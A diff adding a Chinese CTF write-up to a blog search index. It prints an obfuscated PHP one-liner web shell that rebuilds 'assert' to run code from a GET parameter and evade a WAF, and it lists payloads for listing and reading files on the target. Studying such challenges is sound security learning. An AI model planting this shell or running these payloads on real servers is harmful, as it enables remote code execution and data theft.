@@ -1,6 +1,35 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>bugku过狗一句话</title>
+    <url>/2020/03/01/bugku%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D/</url>
+    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">送给大家一个过狗一句话</span><br><span class="line">&lt;?php $poc&#x3D;&quot;a#s#s#e#r#t&quot;; $poc_1&#x3D;explode(&quot;#&quot;,$poc); $poc_2&#x3D;$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[&#39;s&#39;]) ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先看这段php</p>
+<ul>
+<li><p>explode(‘分割的字符’，被分割的字符串)</p>
+<p>explode函数将原来的字符串以分割字符为界限，分成若干元素计入数组</p>
+</li>
+</ul>
+<p>所以$poc_1=[a,s,s,e,r,t],$poc_2=assert.</p>
+<p>也就是通过get方法获取s元素的值并放入assert执行。</p>
+<blockquote>
+<p>assert（）：把字符串按照php代码来执行。</p>
+</blockquote>
+<p>于是接下来有两种方法：</p>
+<ul>
+<li><strong>s=print_r(scandir(‘./‘)) 然后读取fl4g.txt</strong></li>
+<li><strong>s=print_r(glob(“*.*“)) 然后读取show_source(“fl4g.txt”)</strong></li>
+<li><strong>使用file_get_contents(“flag.txt”)读取文件</strong></li>
+<li><strong>还有system(‘ls’)的读取方法但是这里应该没有权限.</strong></li>
+</ul>
+<p>然而这道题好像除了点问题，咋弄都没反应，希望早日调试好错误。</p>
+]]></content>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2020-02-29日目标</title>
     <url>/2020/02/28/2020-02-29%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
     <content><![CDATA[<h2 id="2020-02-29日目标"><a href="#2020-02-29日目标" class="headerlink" title="2020-02-29日目标"></a>2020-02-29日目标</h2><table>
